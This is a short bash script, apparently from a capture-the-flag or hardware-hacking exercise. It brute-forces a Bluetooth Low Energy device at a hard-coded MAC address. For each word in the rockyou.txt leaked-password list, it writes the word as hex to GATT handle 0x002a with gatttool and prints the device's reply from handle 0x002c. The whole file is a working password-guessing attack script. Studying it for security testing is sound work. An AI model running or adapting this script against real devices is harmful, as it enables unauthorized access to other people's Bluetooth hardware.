#!/bin/bash

MAC="D4:E9:F4:B1:57:62"

while IFS= read -r word; do
    # Convert word to hex
    hex=$(printf '%s' "$word" | xxd -p -c 256)

    echo -n "Trying: $word -> "

    # Write word to handle 0x002a
    gatttool -b "$MAC" --char-write-req -a 0x002a -n "$hex" >/dev/null 2>&1

    # Read handle 0x002c
    gatttool -b "$MAC" --char-read -a 0x002c |
        awk -F': ' '{print $2}' |
        xxd -r -p

    echo

done < rockyou.txt
